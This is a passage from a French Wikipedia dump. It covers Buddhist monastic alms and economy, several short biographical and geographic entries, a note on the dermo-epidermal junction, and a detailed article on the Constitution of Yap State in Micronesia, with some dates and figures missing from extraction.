Ainsi, les monastères grandirent jusqu’à accueillir plusieurs milliers de moines, comme cela avait été le cas à Nalanda. En outre, progressivement ces monastères acquirent des terres. Ainsi, aux , les grands monastères du Sri-Lanka possédaient de vastes domaines, qui intégraient des systèmes étendus d’irrigation ainsi que des villages dont la population devait en partie travailler pour leurs propriétaires.
Au , les monastères de Séra, Drépoung, Ganden, au Tibet, pouvaient recevoir 7000 à 8000 moines. Ces communautés vivaient rarement d’aumônes, sauf à l’occasion de pèlerinages entrepris pas les moines.
La même tendance se retrouve au Japon et Chine, et d’une manière générale en Asie de l’est. De par leur taille, la population de laïcs ne suffisait plus à ravitailler ces établissements qui commencèrent à dépendre de dons officiels (rois, empereurs, princes). Mais puisque les aumônes d’aliments cuits étaient inutiles, la règle défendant de recevoir de l’or et l’argent tendit à s’assouplir. On se mit à accepter les dons en espèces, ce qui posa l’épineuse question de la gestion de cet argent, car l’interdiction pour un moine ou une nonne de "toucher" (physiquement) ou de gérer de l’argent restait intacte. Là encore, il fallut recourir aux laïcs pour administrer la fortune acquise.
Chine.
D’autre part, en Chine, on note aussi le développement d’une tradition d’auto-suffisance. Le maître chan () joua un rôle important dans cette évolution. Son code de vinaya, le "Baizhang chinggui" (« les règles pures de Baizhang »), devint très important et prit le dessus sur les codes traditionnels de Vinaya. Dans l’emploi du temps des moines dans les monastères, ce code assigne une place considérable au travail manuel et agricole – qui était donc en principe interdit par le Vinaya classique. Une de phrases les plus connues de Baizhang est « qui ne travaille pas ne mange pas » (ou « un jour sans travail, un jour sans manger ». Cette promotion de l’autarcie des monastères visait à détourner les critiques des confucéens qui voyaient précisément dans les moines des parasites de la société.
Japon.
Au Japon aussi, la mendicité a disparu. Elle reste cependant en vigueur à titre de formation des futurs moines et nonnes zen, et elle est alors connue sous le nom de "Takuhatsu" "(japonais: 托鉢)", littéralement «tendre le bol [pour mendier] »'. Dans leur cas, ils portent aujourd'hui des vêtements traditionnels remontant au Moyen Âge, portant un bâton et une clochette pour avertir les gens de leur présence'. Ils arborent un insigne indiquant leurs noms bouddhiques et ceux de leurs monastères. Le plus souvent, ils se déplacent en petits groupes de dix à quinze, parcourant les rues en file indienne et tendant leurs bols aux fidèles; il arrive aussi qu'ils signalent leur présence en criant le mot "Hō" (« Dharma »), ou encore qu'ils récitent des soutra pour le bien des donateurs, lesquels leur offrent en général du riz non cuit ou de l'argent"". On rencontre aussi des moines solitaires. Ils sont souvent à proximité d'un temple ou d'un lieu de passage (parc, gare...) pour recevoir les offrandes.
Activités commerciales.
Les grands monastères ont également eu des activités commerciales. Ainsi, au Sri Lanka (d'obédience théravada), les bénéfices provenant de l’agriculture étaient réinvestis dans des corporations de marchands. Dans la Chine des Tang (618-907), ils faisaient aussi office de prêteurs sur gage, prêtaient céréales et tissus, exploitaient des moulins et organisaient des foires commerciales. Au Japon, les grands monastères rinzai possédaient des flottes marchandes. Au Tibet, les monastères jouèrent un rôle essentiel dans le développement économique, pratiquant le prêt à intérêt (et justifiant cette pratique par le fait c’était pour le bien du sangha et du Dharma), développant des réseaux commerciaux, et se faisant les intermédiaires les pasteurs et les nomades, deux éléments de base de la société tibétaine. 
Hors de l'Asie.
La mendicité est parfois pratiquée par des communautés bouddhiques en Europe, en Amérique ou encore en Australie, mais cela reste des exceptions. On relèvera ainsi qu'en 2017, sur les onze villages des Pruniers fondés par Thich Nhat Hanh dans le monde, seul celui qui se trouve en Thaïlande pratique régulièrement la mendicité.

</doc>
<doc id="8978218" url="https://fr.wikipedia.org/wiki?curid=8978218" title="Mniszek (Mazovie)">
Mniszek (Mazovie)

Mniszek (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de en 2004.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978219" url="https://fr.wikipedia.org/wiki?curid=8978219" title="Peter Dennis">
Peter Dennis

Peter Dennis est un acteur britannique né à Dorking le et mort le à Los Angeles en Californie.

</doc>
<doc id="8978221" url="https://fr.wikipedia.org/wiki?curid=8978221" title="Mniszek">
Mniszek

Mniszek peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8978222" url="https://fr.wikipedia.org/wiki?curid=8978222" title="Messe de Saint Grégoire">
Messe de Saint Grégoire



</doc>
<doc id="8978225" url="https://fr.wikipedia.org/wiki?curid=8978225" title="Arthur Terry">
Arthur Terry

Arthur Hubert Terry (York, Angleterre - Colchester, Essex ) est un philologue, critique et traducteur britannique spécialiste de la littérature catalane. 
Biographie.
Terry nait à York en 1927 et étudie à l'école Saint Peter de la même cité. En 1947 il passe sa maîtrise en philologie à l'Université de Cambridge, où il est disciple de J. B. Trend. Il vient par la première fois à Barcelone en 1949 grâce à une bourse pour étudier le monachisme catalan ancien. Entre 1950 et 1972 il est professeur de langues et littératures hispaniques à l'Université Queen's de Belfast, où il est agrégé entre 1962-1973, jusqu'au moment où il est nommé agrégé de littérature à l'Université de l'Essex en 1973. 
En 1976 il publie une anthologie de poèmes d'Ausiàs March avec des traductions anglaises et coordonne une série d'essais sur Tirant lo Blanc. Il est une autorité en poésie catalane moderne, et aussi en poésie espagnole (on doit remarquer l'étude de "Campos de Castilla", d'Antonio Machado en 1973). Il se fait connaitre aussi les traductions de Joan Brossa et Gabriel Ferrater.
Prix.
Il est président de l'Anglo-Catalan Society entre 1962 et 1965 et de l'Association Internationale de Langue et Littérature Catalanes entre 1982 et 1988. En 1982 il reçoit la Creu de Sant Jordi, une haute distinction donnée par le gouvernement régional de la Catalogne. En 1995 on lui donna le Prix International Ramon Llull et en 2001 le Prix de la Critique de la revue Serra d'Or.

</doc>
<doc id="8978228" url="https://fr.wikipedia.org/wiki?curid=8978228" title="Georges Choumnos">
Georges Choumnos

Georges Choumnos (en grec Γεώργιος Χοῦμνος ; mort après 1342) est un homme d'État byzantin.
Biographie.
Georges Choumnos est un fils du savant et homme d'État Nicéphore Choumnos, et un frère du général et homme d'État Jean Choumnos. Il est probablement identifiable au "megas stratopedarchēs" Choumnos qui, en 1328, lors de la dernière phase de la , est gouverneur de Thessalonique et qui défend sans succès la ville contre les forces d'Andronic III Paléologue. Il apparaît ensuite à la fin du règne d'Andronic III, à partir de 1337, occupant la position d’"epi tēs trapezēs" (maître de la table impériale). Il est à l'évidence une personne influente : son fils au nom inconnu est apparenté à Andronic III, des écrits mentionnent que Georges lui-même prend la parole en premier lors de conseils impériaux, avant même un proche et assistant d'Andronic III, le "megas domestikos" Jean Cantacuzène. En 1339, il est également mentionné comme chef ("kephalatikeuon") d'un des districts de Constantinople.
Lors de la guerre civile byzantine de 1341–1347, il reste loyal au fils en bas âge d'Andronic III, Jean V Paléologue, et s'oppose à Cantacuzène ; en récompense, il est élevé au rang de "megas stratopedarchēs" lors du couronnement de Jean V le . Une de ses nièces devient même la seconde épouse d'un des principaux meneurs du conseil de régence d'Andronic III, Alexis Apokaukos ; mais fin 1342, Choumnos tombe en disgrâce auprès d'Apokaukos lorsqu'il plaide en faveur de la paix avec Cantacuzène, et est assigné à résidence. Peut-être est-il identifiable au moine nommé Gerasimos Choumnos, ce qui indiquerait qu'il aurait été peu après forcé de se retirer dans un monastère.

</doc>
<doc id="8978229" url="https://fr.wikipedia.org/wiki?curid=8978229" title="Jonction dermo-épidermique">
Jonction dermo-épidermique

La jonction dermo-épidermique, appelée aussi lame basale épidermique ou membrane basale épidermique, est la région tissulaire qui sépare le derme de l'épiderme.
Structure.
La microscopie électronique révèle trois zones distinctes dans la jonction dermo-épidermique : 
Fonctions.
La jonction dermo-épidermique a une fonction d'adhésion entre l'épiderme et le derme, de barrière physico-chimique, de circulation orientée de nutriments et de composants du système immunitaire.
Maladies.
Les dermatoses bulleuses de nature auto-immune (nécrolyse épidermique toxique, syndrome de Stevens-Johnson) sont liées à la présence d'anticorps dirigés contre les structures antigéniques des systèmes d'adhésion interkératinocytaire ou de la jonction dermo-épidermique.

</doc>
<doc id="8978232" url="https://fr.wikipedia.org/wiki?curid=8978232" title="Fiona Kennedy">
Fiona Kennedy

Fiona Kennedy Clark est une actrice et chanteuse écossaise. Elle est la fille du chanteur écossais et gaélique Calum Kennedy et d'Anne Gillies. Étant enfant, elle apparaît auprès de ses parents lors de performances familiales, qui se développa plus tard en une carrière solo à succès.
Carrière.
Kennedy a expérimenté d'autres domaines du divertissement, y compris le cinéma, le théâtre, la télévision et la radio. Ses apparitions à la télévision incluent la série , et "Mauro Gypsy", un épisode spécial de Grampian en 1979-1980, quatre saisons de " Record Breakers " sur BBC1 et le Show du nouvel an avec Sir Trevor MacDonald. Elle a également présenté "Dans les coulisses Monarch of the Glen ". Elle est également apparue sur la BBC TV dans " Songs of Praise " en tant que chanteuse...
Elle a joué un rôle dans le film "" en 1973, dans lequel elle a joué Holly.
Kennedy présente maintenant des programmes de télévision sur l'Écosse, la vie et l'histoire écossaise pour les chaînes américaines et canadiennes. Sa fille, Sophie Kennedy Clark, est une actrice. Elle est également l'un des solistes du groupe de musique celtique appelé Highland Heartbeat.
Honneurs.
Fiona Kennedy a été nommée Officier de l'ordre de l'Empire britannique en 2014 au nouvel an pour ses services rendus à la musique et pour ses œuvres de bienfaisance en Écosse.

</doc>
<doc id="8978233" url="https://fr.wikipedia.org/wiki?curid=8978233" title="Christopher Knights">
Christopher Knights

Christopher John "Chris" Knights, né le , à Londres, est un acteur et monteur anglais.

</doc>
<doc id="8978236" url="https://fr.wikipedia.org/wiki?curid=8978236" title="Nécrolyse épidermique toxique">
Nécrolyse épidermique toxique



</doc>
<doc id="8978245" url="https://fr.wikipedia.org/wiki?curid=8978245" title="Constitution de l'État de Yap">
Constitution de l'État de Yap

La constitution de l'État de Yap, un des quatre États des États fédérés de Micronésie est le texte de droit fondamental de l'État de Yap. Elle est adoptée dans le courant de l'année 1982, est promulguée le 24 décembre de cette même année et entre en vigueur le janvier 1983. Des amendements ont été adoptés par référendum et promulgués le 24 novembre 2006. La constitution comporte 15 articles. Elle est consultable en anglais sur le site internet de la Cour suprême des États fédérés de Micronésie.
Histoire de la Constitution.
La constitution de l'État de Yap est élaborée par une convention constitutionnelle formée de délégués élus par le peuple. La constitution rédigée à cette occasion est proposée au référendum. Elle est adoptée à la majorité et promulguée le 24 décembre 1982. Elle entre en vigueur le janvier 1983. À cette époque, l'État de Yap constitue une subdivision du Territoire sous tutelle des îles du Pacifique administré par les États-Unis. L'indépendance n'occasionne pas de changements dans la constitution. Onze amendements ont été proposés en 2004 par une convention constitutionnelle. Ils ont été approuvés par le peuple le 7 novembre 2006 et certifiés par le commissaire aux élections de l'État de Yap le 24 novembre 2006. Un amendement à l'article XIV de la constitution, par ajout d'une section 12, concernant l'interdiction des jeux d'argent, est adopté par l'assemblée législative le 14 mai 2014 (résolution 8-102). Ainsi que le nécessite toute tentative de modification de la constitution, il est proposé au référendum. L'amendement est rejeté le 4 novembre 2014 par 2545 voix contre 2284.
Structure de la Constitution.
La Constitution telle qu'elle a été ratifiée le 24 décembre 1982 comprend, après un bref préambule, quinze articles. Onze amendements ont été apportés en 2006 sans modifier le nombre d'articles. À l'exception des articles I et VIII, les articles sont découpés en sections. Certains amendements modifient le texte initial, d'autres ajoutent une section. Les articles I à VII définissent la structure de base du gouvernement.
Préambule et article 1.
Ce préambule fonde la constitution sur le peuple de l'État de Yap. Il n'est nullement fait mention des États fédérés de Micronésie et de sa constitution. Cette dernière a été ratifiée en 1979 alors que le territoire est encore administré dans le cadre du Territoire sous tutelle des îles du Pacifique, puis amendée en 1990 peu après l'indépendance reconnue par l'ONU. Dans les faits, la constitution de l'État de Yap est subordonnée à celle de la Micronésie. Le préambule met clairement en avant la préoccupation de continuer à suivre les usages traditionnels de la société en y intégrant de façon sélective les éléments de la vie moderne.
L'article I.
L'article I est une clause de suprématie simple : .
Article II : Les droits fondamentaux.
L'article II comprend treize sections dont le contenu est presque identique à celui de la . Les droits garantis incluent la liberté de parole et de presse, la séparation de l'église et de l'état. La constitution garantie également les citoyens contre les fouilles, les perquisitions et les saisies abusives, le droit à une procédure judiciaire régulière et une protection égale, le droit à un conseil et à la confrontation dans les affaires pénales, ainsi qu’à un procès rapide et public, le droit de ne pas s'incriminer soi-même, le droit contre une caution excessive ou une peine cruelle et exceptionnelle.
L'article II garantit le droit de demander un bref d'habeas corpus, l'interdiction de promulgation de lois rétroactives ou compromettant des obligations contractuelles, l'interdiction de l'esclavage, le droit à une juste indemnité lors d'une expropriation, le droit de poursuivre le gouvernement en justice pour obtenir réparation. La dernière section rappelle que cette énumération ne peut interdire l'existence d'autres droits pour la population.
Les chefs traditionnels et les coutumes.
La première section de l'article III de la constitution yapaise, ajoutée en 2006 par un amendement, reconnaît le rôle dans les traditions et les coutumes des ', les trois chefs suprêmes des îles Yap, ceux qui y possèdent les trois terres de plus haut rang et sous l'autorité desquels l'ensemble des villages, comportant eux-mêmes des chefs, est réparti en trois '. Traditionnellement et conséquence du système hiérarchique du ', les îles Yap ont toujours eu un statut plus élevé que les îles extérieures de Yap. Pour veiller au respect et au maintien des traditions et coutumes, la deuxième section de l'article III de la constitution formalise depuis sa promulgation en 1982 l'existence de deux conseils des chefs : l'un pour les chefs des municipalités des îles Yap, le conseil de ' et l'autre pour les chefs des municipalités des îles extérieures de Yap, le conseil de"".
Les sections 16 à 18 de l'article V de la constitution habilitent les conseils à remplir des fonctions qui concernent la tradition et la coutume dans l'État et à examiner et à désapprouver un acte de la législature de l'État de Yap s'il enfreint à leur sens les coutumes et les traditions. Celles-ci ne sont pas codifiées mais transmises oralement. D'après Tina Takashy, dans le cadre du foyer, ceci peut entraîner des abus et violations des droits de l'homme lorsque l'objectif est d'assurer la protection de la cohésion sociale et l'harmonie et la survie commune. La première section de l'article XV prévoit la possibilité de codifier les lois traditionnelles. Le droit de veto, que les conseils utilisent avec parcimonie, ne peut pas être annulé. Le législateur, s'il souhaite poursuivre le cheminement législatif, doit incorporer les objections dans le projet de loi, le renvoyer pour examen à l'assemblée puis, en cas d'adoption, à nouveau aux conseils pour approbation. Pour éviter un blocage, les projets de loi peuvent être soumis à une lecture préalable par les conseils. En 1982, au cours de la convention constitutionnelle yapaise, le droit de veto, hérité de la Charte du district de Yap de 1978, a fait l'objet d'un intense débat. Le Comité permanent de la convention, organe de proposition, l'écarte au profit d'un texte exigeant que seuls les projets de loi relatifs à la coutume et à la tradition soient transmis aux Conseils et qu'ils ne puissent que commenter et non désapprouver un projet de loi. Les délégués de la convention ont refusé cette recommandation.
La troisième section de l'article III spécifie que rien dans la Constitution ne pourra être interprété comme une limitation ou une invalidation de quelque tradition ou coutume reconnue. Les coutumes et traditions priment sur tout texte de loi, toute interprétation de la constitution et même sur toute décision judiciaire. Pour l'avocat en droit Brian Z. Tamanaha, .
Article IV : Les élections.
L'article IV fixe les conditions de vote. Tout citoyen âgé de 18 ans, inscrit sur les listes électorales, ayant satisfait à la période minimale de résidence, n'ayant pas été radié par une condamnation en justice, pour incapacité mentale ou folie est autorisé à voter. L'État doit prescrire par la loi la méthode de vote et fournir les moyens nécessaires à l'organisation du suffrage et au secret du vote. La date des élections générales est fixée au premier mardi suivant le premier lundi de novembre d'une année paire tous les quatre ans. Des circonstances exceptionnelles peuvent différer l'élection jusqu'à 60 jours. Des élections spéciales pourront être tenues conformément à la loi. En cas d'égalité de vote entre les deux candidats ayant eu le plus de votes, un second tour doit être organisé pour les départager.
Les circonscriptions électorales - nommées districts - dans lesquelles sont élus les membres de l'Assemblée législative sont définis par l'article XI. Le premier district électoral est celui de l'archipel des îles Yap et doit compter six élus. Les quatre autres districts ne choisissent qu'un seul élu. Le deuxième district électoral est composé des atolls d'Ulithi, de l'île de Fais, de l'atoll de Sorol et de l'atoll de Ngulu. Le troisième district correspond à l'atoll de Woleai. L'atoll d'Eauripik, l'atoll de Faraulep et l'atoll d'Ifalik sont regroupés dans le quatrième district. Le cinquième district concerne l'île de Satawal, l'atoll de Lamotrek et l'atoll d'Elato. Il est prévu une mise à jour de ces districts tous les 10 ans par l'Assemblée. Celle-ci qui doit faire en sorte que la population soit approximativement égale par élu tout en tenant compte de la configuration sociale et géographique de l'État.
Assemblée législative et droit coutumier.
L'article V concerne l'Assemblée législative, investie du pouvoir législatif de l'État. Elle est composée de dix membres, âgés d'au moins 25 ans, citoyens des États fédérés de Micronésie depuis au moins dix ans, résidents de l'État depuis au moins cinq ans et de la circonscription électorale à laquelle ils se présentent, et où ils sont inscrits sur les listes électorales, depuis au moins l'année qui précède immédiatement le dépôt de leur candidature. Ils ne doivent pas avoir été reconnus coupables d'un crime, sauf s'ils ont reçu un pardon restaurant leurs droits. Chacun des membres est élu lors d'une élection générale dans une circonscription électorale tel que défini dans l'article XI de la Constitution. Leur mandat commence à midi le deuxième lundi de janvier après les élections générales et se termine à midi le deuxième lundi de janvier, quatre ans plus tard. En cas de vacance d'un siège à moins d'un an de la fin du mandat, le Gouverneur l'attribue par nomination. Autrement, il est attribué par une élection spéciale.
Les élus reçoivent un salaire prescrit par la loi. Toute augmentation de salaire votée ne devient effective qu'après la fin de leur mandat. Les élus ne peuvent postuler pendant un an après la fin de leurs fonctions à un emploi ou à une fonction publique crée ou dont le traitement aura été augmenté sous leur mandat par acte législatif. Sauf cas de crime ou de violation de paix, les élus ne peuvent pas être arrêtés. Ils ne sont pas tenu de répondre de leurs déclarations ou actions prises dans l'exercice de leurs fonctions. Un membre de l'Assemblée peut être puni par la censure ou, par un vote des deux tiers des membres, par suspension ou expulsion.
La conduite des affaires courantes nécessite la présence des deux tiers de l'Assemblée. L'obtention de la majorité des voix suffit à l'adoption d'un texte de loi ou d'une résolution, hormis lorsqu'il s'agit de son passage final, auquel cas le vote des tiers des membres est nécessaire. Un projet de loi doit passer par deux lectures à l'Assemblée législative à des jours différents. Une fois adopté, il est transmis au Conseil de Pilung et au Conseil de Tamol pour examen. S'ils jugent que le projet de loi affecte négativement la tradition et la coutume ou le rôle ou la fonction d'un chef traditionnel tel que reconnu par la tradition et la coutume, ils en décrivent les effets négatifs à l'attention de l'Assemblée dans les trente jours. Un projet de loi désapprouvé peut être modifié pour répondre aux objections des Conseils et, s'il est modifié et adopté, une seule lecture est alors nécessaire. Il est ensuite à nouveau soumis aux Conseils. Un projet de loi ayant passé avec succès l'examen des chefs coutumiers est transmis au gouverneur. Il dispose de dix ou trente jours selon les situations pour examiner le projet de loi qui lui est présenté. Passé ce délai, le projet devient loi. Le gouverneur le signe s'il approuve le projet de loi, lequel devient une loi. Le gouverneur peut opposer son veto à un projet de loi dans son ensemble. S'il s'agit d'une loi prévoyant des dépenses publiques, il peut s'opposer à un ou plusieurs postes de dépenses, en les supprimant ou en les modifiant. Les parties non censurées deviennent loi. Si l'Assemblée accepte les parties modifiées, une adoption en une seule lecture avec deux tiers des voix conduit à son adoption. Si le projet de loi est modifié par l'Assemblée, il est à nouveau transmis au gouverneur qui peut choisir de le signer ou non.
En cas de malversation, faute d'exécution ou condamnation pour crime, le gouverneur, le lieutenant-gouverneur ou un juge de la Cour d'État peut être démis de ses fonctions par un vote des trois quarts des membres de l'Assemblée législative.
Le pouvoir exécutif.
Les sections 1 à 5 de l'article VI définissent les postes de gouverneur et de lieutenant-gouverneur. Le pouvoir exécutif de l'État est exercé par le gouverneur, en duo avec un lieutenant-gouverneur. Leur salaire est prescrit par la loi et ne peut être augmenté ou diminué que dans le cadre d'une loi générale s'appliquant aux agents salariés du gouvernement de l'État. Si le postulant au poste de gouverneur est un résident des îles Yap, le postulant au poste de lieutenant-gouverneur sera un résident des îles extérieures de Yap, et si le gouverneur est un résident des îles extérieures de Yap, le lieutenant-gouverneur sera un résident des îles Yap. Le duo est élu par les électeurs de l'État lors d'une élection générale, pour un mandat de quatre ans, renouvelable consécutivement une fois. Pour être éligible, il faut être âgé d'au moins trente ans, être citoyen des États fédérés de Micronésie par la naissance, avoir été résident de l'État pendant au moins quinze ans et durant les cinq années précédant le dépôt de la candidature, être une personne éligible à voter dans l'État, et n'avoir jamais été reconnu coupable d'un crime à moins d'avoir obtenu un pardon restaurant les droits civils. La personne qui reçoit le plus grand nombre de votes, et au moins quarante-cinq pour cent des suffrages exprimés, est élue gouverneur. Si ce quota n'est pas atteint les deux duo ayant reçu le plus grand nombre de votes participent à une élection spéciale.
Le gouverneur ne doit pas détenir une autre fonction publique ou emploi au cours de son mandat. Quant au lieutenant-gouverneur, il peut être nommé par le gouverneur à la tête de la direction d'un département exécutif établi par la loi et assumer les autres responsabilités assignées par le gouverneur ou prescrites par la loi. En cas d'absence ou d'incapacité du gouverneur à exercer ou à s'acquitter de ses fonctions, le lieutenant-gouverneur doit y suppléer. Si celui-ci ne le peut pas, le directeur d'un des principaux départements exercera les pouvoirs et les fonctions du poste de Gouverneur. Si les postes du gouverneur et du lieutenant-gouverneur sont vacants, le président de l'Assemblée législative doit succéder au gouverneur.
Le gouverneur est responsable de l'exécution fidèle des lois. Il peut accorder des sursis et des grâces, commutations, après la condamnation, sous réserve de la réglementation établie par la loi, sauf dans les cas de destitution. Aucun sursis, commutation et grâce ne peut être accordé à une personne détenant le poste de lieutenant-gouverneur ou de gouverneur. Le gouverneur doit communiquer chaque année à l'Assemblée législative, par message, la condition de l'État, et doit de la même manière recommander les mesures qu'il jugera souhaitable.
La section 8 de l'article VI institue que les postes exécutifs, administratifs, les ministères et les institutions de l'État et du Gouvernement ainsi que leurs fonctions respectives, leurs pouvoirs et leurs droits doivent être établis par la loi. Chaque département principal est sous la supervision du gouverneur et est dirigé par un directeur unique, sauf disposition contraire de la loi. Il est désigné et nommé par le gouverneur, avec l'avis et le consentement de l'Assemblée législative, pour servir à la discrétion du gouverneur pendant son mandat. Seul le renvoi du procureur général est soumis à l'avis et au consentement de l'Assemblée législative. La nomination des membres des directions des organismes de régulation ou quasi-judiciaires se fait avec l'avis et le consentement de l'Assemblée législative. La durée du mandat et la révocation des membres est prévue par la loi.
La section 9 prévoit la possibilité pour le gouverneur de déclarer l'état d'urgence jusque pendant 30 jours pour préserver la paix publique, la santé ou la sécurité, à un moment d'urgence extrême causé par des troubles civils, une catastrophe naturelle, ou la menace immédiate de guerre ou d'insurrection. L'état d'urgence ne peut entraver le pouvoir judiciaire mais reste libre de toute ingérence judiciaire pendant quinze jours après sa première publication. Il peut nuire à un droit civil dans la mesure réellement nécessaire pour la préservation de la paix, la santé ou la sécurité. L'état d'urgence peut être prolongé : dans les trente jours après la déclaration d'urgence, l'Assemblée législative doit répondre à la convocation du président de l'Assemblée ou du gouverneur d'examiner la révocation, modification ou extension de la déclaration. Hormis si elle expire selon ses propres termes, est révoquée ou prolongée, une déclaration d'urgence est effective durant trente jours.
Article 7 : Pouvoir judiciaire.
"La section 2 a été modifiée par un amendement constitutionnel adopté par les électeurs de l'État de Yap le 7 novembre 2006 et certifié par le commissaire aux élections de l'État de Yap le 24 novembre 2006. L'amendement a été défini dans la proposition de loi , D1 de la Convention constitutionnelle de Yap de 2004. La portion ajoutée est ."
Section 1. Le pouvoir judiciaire de l'État est exercé par la Cour d'État, et par les autres tribunaux qui peuvent être créés par la loi.
Section 2. La Cour d'État est la plus haute juridiction de l'État et se compose d'un juge en chef et de deux juges associés. Le nombre de juges associés peut être augmenté par la loi à la demande de la Cour d'État. Les juges retraités de la Cour d'État , peuvent servir temporairement à la Cour d'État à la demande du juge en chef. Le juge en chef peut donner une affectation spéciale à une personne pour servir de juge associé pour un cas précis. En cas de vacance du juge en chef, ou s'il est malade, absent ou incapable d'agir, un juge associé doit servir temporairement à sa place.
Section 3. Le gouverneur doit désigner et nommer, avec l'avis et le consentement de l'Assemblée législative, le juge en chef et les juges associés de la Cour d'État. Les juges de la Cour d'État doivent tenir leurs bureaux pour un mandat de six ans.
Section 4. La rémunération des juges de la Cour d'État doit être prévue par la loi. Leur rémunération ne doit pas être diminuée au cours de leurs mandats respectifs, sauf par une loi générale s'appliquant aux agents salariés du gouvernement de l'État.
Section 5. Les tribunaux doivent avoir une cour de premier degré et une cour d'appel tel que prescrit par la loi.
 : Une disposition d'une loi de l'État qui tente de placer la formule "compétence exclusive" dans les statuts de la Cour d'État de Yap ne peut pas enlever à un tribunal national des responsabilités qui lui sont imposées par la constitution nationale, qui est la «loi suprême des États fédérés de Micronésie." Gimnang v. Yap, 5 FSM Intrm. 13,23 (App. 1991). Une loi de l'État ne peut pas défausser la Cour suprême des États fédérés de Micronésie de sa compétence exclusive dans les cas relevant de l'art. XI, § 6 (a) de la Constitution des États fédérés de Micronésie. Faw v. FSM, 6 FSM Intrm. 33, 36-37 (Yap 1993).
Section 6. La Cour d'État doit établir et promulguer des règles régissant la pratique et la procédure dans les affaires civiles et pénales, qui aura la force et l'effet de la loi, à condition que l'Assemblée législative peut créer ou modifier ces règles par la loi. La Cour d'État est une cour d'enregistrement.
Section 7. Les décisions de la Cour doivent être compatibles avec la présente Constitution, les traditions et les coutumes de l'État, et la configuration sociale et géographique de l'État.
Article 9 : Fiscalité et finances.
"La section 9 a été ajoutée par un amendement constitutionnel adopté par les électeurs de l'État de Yap le 7 novembre 2006 et certifié par le commissaire aux élections de l'État de Yap le 24 novembre 2006. L'amendement a été défini dans la proposition de loi , D2 de la Convention constitutionnelle de Yap de 2004."
Section 1. Le pouvoir d'imposition ne doit jamais être remis, suspendu ou contracté continuellement
Section 2. Aucun impôt ne doit être perçu ou des fonds publics appropriés ou des biens publics transférés, sauf à des fins publiques.
Section 3. La propriété du gouvernement de l'État ou de ses subdivisions politiques est exonérée d'impôt.
Section 4. Le pouvoir de taxation doit être réservé au gouvernement de l'État, hormis lorsqu'il peut être délégué par l'Assemblée législative aux gouvernements locaux ; à condition que le gouvernement de l'État ne peut pas taxer les biens immobiliers. L'Assemblée législative peut répartir les recettes de l'État entre les gouvernements locaux.
Section 5. L'assemblée législative ne doit pas s'approprier les fonds en excédents des revenus disponibles estimés.
Section 6. Aucune somme ne doit être retirée du Trésor public, ni tenue en obligation, sauf en conformité avec le droit.
Section 7. Le gouverneur soumet à l'Assemblée législative un budget exposant un plan complet des dépenses et des recettes proposées prévues pour le gouvernement de l'État, accompagnées d'autres informations que l'Assemblée législative peut exiger. Le budget doit être présenté dans un document écrit, en une seule fois, et pour les années d'exercices prescrites par la loi.
Le gouverneur doit également soumettre des projets de loi pour pourvoir aux dépenses proposées et pour toutes les recettes supplémentaires recommandées en un temps prescrit par la loi.
Section 8. Il doit y avoir des audits réguliers et indépendants des organismes de l'État et des revenus.
Section 9. L'État doit mener des auditions régulières de supervision publique des organismes de l'État et des revenus.
Article 10 : Amendement.
Section 1. Un amendement à la présente Constitution peut être proposé par une Convention constitutionnelle. Au moins tous les dix ans, l'Assemblée législative doit soumettre aux électeurs la question: Si la majorité des suffrages exprimés sur la question est affirmative, les délégués à la Convention seront choisis au plus tard à la prochaine élection ordinaire dans l'État.
Section 2. Un amendement à la présente Constitution peut être proposé par une initiative populaire. Une initiative est proposée par une pétition contenant l'amendement proposé. La pétition doit être signée par au moins vingt-cinq pour cent des électeurs inscrits et déposée auprès du gouverneur qui en certifie la validité.
Section 3. L'Assemblée législative peut proposer un amendement à la présente Constitution en adoptant une résolution par un vote des trois quarts des membres de l'Assemblée législative.
Section 4. Lors d'une élection générale ou spéciale, ou d'un référendum, une proposition de modification doit être soumise à l'électorat pour approbation ou rejet lors d'un scrutin séparé. Un amendement proposé devient une partie de la Constitution lorsqu'il est approuvé par une majorité des voix exprimées.
Section 5. L'Assemblée législative doit affecter des fonds et promulguer les lois nécessaires à la mise en œuvre du présent article.
Article 12 : Santé et éducation.
"La section 3 a été ajoutée par un amendement constitutionnel adopté par les électeurs de l'État de Yap le 7 novembre 2006 et certifié par le commissaire aux élections de l'État de Yap le 24 novembre 2006. L'amendement a été défini dans la proposition , D3 de la Convention constitutionnelle de Yap de 2004."
Section 1. Le Gouvernement de l'État doit assurer la protection et la promotion de la santé publique, ce qui peut inclure la pratique traditionnelle de la médecine.
Section 2. Le Gouvernement de l'État doit assurer l'éducation publique et les écoles. L'enseignement élémentaire public doit être gratuit. Les traditions et coutumes du peuple de cet État doivent être enseignées dans les écoles publiques comme prévu par la loi.
Section 3. Les normes pour l'éducation dans l'État de Yap doivent être prescrites par la loi.
Article 13 : Conservation et développement des ressources.
"Les sections 1 et 2 ont été modifiées par un amendement constitutionnel adopté par les électeurs de l'État de Yap le 7 novembre 2006 et certifié par le commissaire aux élections de l'État de Yap le 24 novembre 2006. L'amendement des sections 1 et 5 a été défini dans la proposition de loi , D1 de la Convention constitutionnelle de Yap de 2004 et l'amendement de la section 2 dans la proposition de loi , D1. Les portions ôtées sont entre [crochets], celles rajoutées sont ."
Section 1. Le Gouvernement de l'État [doit promouvoir] la protection, la conservation et le développement durable de l'agriculture, de la pêche, des ressources minérales, forestières, de l'eau, de la terre et des autres ressources naturelles.
Section 2. Un accord pour l'utilisation de la terre où l'un des partis n'est pas un citoyen des États fédérés de Micronésie ou une société entièrement détenue par un de ses citoyens ne doit pas dépasser une durée de [cinquante] ans. L'Assemblée législative peut prescrire une durée moindre.
Section 3. Un titre de propriété de la terre ne peut être acquis que d'une manière compatible avec les traditions et les coutumes.
Section 4. Les substances radioactives et nucléaires ne doivent pas être testées, stockées, utilisées ou éliminées dans l'État.
